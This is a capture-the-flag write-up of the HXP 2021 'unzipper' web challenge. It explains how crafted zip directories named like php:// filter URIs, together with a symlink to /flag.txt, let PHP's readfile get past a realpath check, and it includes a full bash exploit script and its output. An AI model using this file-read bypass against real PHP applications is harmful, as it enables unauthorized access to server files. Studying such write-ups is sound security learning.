---
title: "HXP 2021 - unzipper (Web)"
header:
  overlay_image: /assets/images/hxp-2021/header.png
  overlay_filter: 0.5
  caption: "Photo credit: HXP CTF Organisers"

tags:
  - hxp
  - writeup
  - web
  - realpath
  - filters
  - php
  - zip
---

Summary: The PHP function realpath can be tricked to allow other protocol wrappers to be used in
readfile by specially crafting the directories in an unzipped zip file.

## Challenge Prompt

```
unzipper
by hlt
web
Difficulty estimate: medium - medium

Points: round(1000 · min(1, 10 / (9 + [49 solves]))) = 172 points

Description:
Here, let me unzip that for you.

hxp's seal of open source web quality

Download:
unzipper-344248a9240214c2.tar.xz (2.0 KiB)

Connection (mirrors):
http://65.108.176.76:8200/
```

Attachment: [challenge file]({{ site.url }}{{ site.baseurl }}/assets/files/hxp-2021/unzipper-344248a9240214c2.tar.xz)

## Solution

There is only one important PHP script, `index.php`.

```php
<?php
session_start() or die('session_start');

$_SESSION['sandbox'] ??= bin2hex(random_bytes(16));
$sandbox = 'data/' . $_SESSION['sandbox'];
$lock = fopen($sandbox . '.lock', 'w') or die('fopen');
flock($lock, LOCK_EX | LOCK_NB) or die('flock');

@mkdir($sandbox, 0700);
chdir($sandbox) or die('chdir');

if (isset($_FILES['file']))
    system('ulimit -v 8192 && /usr/bin/timeout -s KILL 2 /usr/bin/unzip -nqqd . ' . escapeshellarg($_FILES['file']['tmp_name']));
else if (isset($_GET['file']))
    if (0 === preg_match('/(^$|flag)/i', realpath($_GET['file']) ?: ''))
        readfile($_GET['file']);

fclose($lock);
```

All operations occur in a sandboxed directory generated for each new session.

It has two important paths:

* If a file is uploaded, it will be unzipped in the sandboxed directory.
* Otherwise, if a `file` GET parameter is provided, it performs the following:
    1. Check if the word 'flag' is not in the path resolved by `realpath($_GET['file'])`.
    2. If it passes, run `readfile($_GET['file'])`.

Note that a symbolic link is not possible to be used directly. From the [man page for
realpath](https://man7.org/linux/man-pages/man3/realpath.3.html):

```
       realpath() expands all symbolic links and resolves references to
       /./, /../ and extra '/' characters in the null-terminated string
       named by path to produce a canonicalized absolute pathname.  The
       resulting pathname is stored as a null-terminated string, up to a
       maximum of PATH_MAX bytes, in the buffer pointed to by
       resolved_path.  The resulting path will have no symbolic link,
       /./ or /../ components.
```

The problem here is that `realpath` and `readfile` contain an incongruence in the way they process
the path passed to it. [Protocol schemes and wrappers](https://www.php.net/manual/en/wrappers.php)
can be specified in the input to `readfile` but `realpath` expects a strict unix path. Thus, we can
use this confusion in conjunction with our ability to create directories and files with the zip file
to force `realpath` into resolving a valid UNIX path but cause `readfile` to process a `php://` URI.

To execute `readfile("php://filter/convert.base64-encode/resource=exploit")`, we need the following
directory structure:

```
php:/
php:/filter/
php:/filter/convert.base64-encode/
php:/filter/convert.base64-encode/resource=exploit
```

This allows us to read from the `exploit` file which can be a symlink to `/flag.txt`. Zipping up
this directory structure plus the symlink and triggering the file read path grants us the flag.

The exploit is as follows. This could probably have been simplified with the `file://` scheme but
this probably demonstrates the directory structure better.

```bash
#!/bin/bash

rm -rf exploit.dir
mkdir -p exploit.dir
pushd exploit.dir

TARGET='http://65.108.176.76:8200'
EPATH='php://filter/convert.base64-encode/resource=exploit'

mkdir -p $EPATH
ln -s /flag.txt exploit
zip -y -r exploit.zip *

curl -H 'Cookie: PHPSESSID=e0pabhfs43a7i8q3plo0ghs6i8' $TARGET -F "file=@exploit.zip"
curl -s -H 'Cookie: PHPSESSID=e0pabhfs43a7i8q3plo0ghs6i8' "$TARGET/?file=$EPATH" | base64 -d

echo
popd
```

Running the exploit to get the flag:

```console
vagrant@ubuntu-xenial:/vagrant/hxp/unzipper$ bash exploit.sh
/vagrant/hxp/unzipper/exploit.dir /vagrant/hxp/unzipper
  adding: exploit (stored 0%)
  adding: php:/ (stored 0%)
  adding: php:/filter/ (stored 0%)
  adding: php:/filter/convert.base64-encode/ (stored 0%)
  adding: php:/filter/convert.base64-encode/resource=exploit/ (stored 0%)
hxp{at_least_we_have_all_the_performance_in_the_world..._lolphp_:/}

/vagrant/hxp/unzipper
vagrant@ubuntu-xenial:/vagrant/hxp/unzipper$
```

The generated directory containing the zip file and the zipped contents looks like so:

```console
$ find exploit.dir
exploit.dir
exploit.dir/exploit
exploit.dir/exploit.zip
exploit.dir/php:
exploit.dir/php:/filter
exploit.dir/php:/filter/convert.base64-encode
exploit.dir/php:/filter/convert.base64-encode/resource=exploit
```

**Flag:** `hxp{at_least_we_have_all_the_performance_in_the_world..._lolphp_:/}`
